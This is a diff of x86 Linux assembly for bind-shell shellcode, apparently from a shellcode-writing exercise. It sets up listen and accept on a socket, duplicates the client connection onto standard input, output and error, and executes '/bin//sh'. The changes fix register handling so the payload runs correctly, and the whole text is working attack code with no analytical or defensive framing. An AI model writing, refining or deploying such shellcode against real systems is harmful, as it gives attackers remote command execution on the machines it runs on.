@@ -41,11 +41,10 @@ mov dl, 16
 int 0x80
 
 Listen:
+xor eax,eax
 mov ax,363
-;mov bx,[sockfd]
 mov cl,10
 int 0x80
-;ret 
 
 ;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
 Accept:
@@ -54,15 +53,15 @@ mov ax,364
 mov ecx, client_family
 mov edx, client_size
 int 0x80
-;mov [newfd], eax
-;ret
+mov ebx, eax
 
 CopyDescriptors:
 mov al, 63
-;mov bx, [newfd]
+xor ecx,ecx
 mov cl, 0
 int 0x80
 
+; dup system call
 mov al, 63
 xor ecx,ecx
 mov cl, 1
@@ -73,17 +72,17 @@ mov al, 63
 xor ecx,ecx
 mov cl, 2
 int 0x80
-;ret
 
 
+xor eax,eax
 push eax
-mov al,11
 push 0x68732f2f
 push 0x6e69622f
 mov ebx, esp
-push ecx
+push eax
 push ebx
 mov ecx, esp
 mov edx, 0
+mov al,11
 int 0x80
 
